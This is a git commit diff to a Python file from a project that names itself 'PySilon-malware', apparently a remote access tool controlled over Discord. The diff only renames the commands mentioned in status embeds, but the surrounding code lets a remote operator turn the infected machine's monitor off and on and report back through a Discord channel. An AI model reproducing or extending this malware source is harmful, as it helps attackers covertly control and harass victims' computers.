de271f1aad37172eccb5ebb2deea9af38dbf9056
JuicyChann <nik.xeiladakis@gmail.com>
2023-11-18 19:08:52 +0200

    update embeds

--- resources/source_code/monitor_control.py
+++ resources/source_code/monitor_control.py
@@ -15,12 +15,12 @@ elif message.content == '.monitors-off':
 
         threading.Thread(target=monitor_off).start()
 
-        embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .turnon```', colour=discord.Colour.green())
+        embed = discord.Embed(title="🟢 Success",description=f'```Monitor turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
 
     else:
-        embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .turnon```', colour=discord.Colour.red())
+        embed = discord.Embed(title="🔴 Hold on!",description=f'```Monitor already turned off. Turn it back on by using .monitors-on```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
 
@@ -32,11 +32,11 @@ elif message.content == '.monitors-on':
             with monitor:
                 monitor.set_power_mode(1)
 
-        embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .turnoff```', colour=discord.Colour.green())
+        embed = discord.Embed(title="🟢 Success",description=f'```Monitor has been turned on. Turn it off by using .monitors-off```', colour=discord.Colour.green())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
         turned_off = False
     else: 
-        embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .turnoff```', colour=discord.Colour.red())
+        embed = discord.Embed(title="🔴 Hold on!",description=f'```The monitor is not turned off. Turn it off by using .monitors-off```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
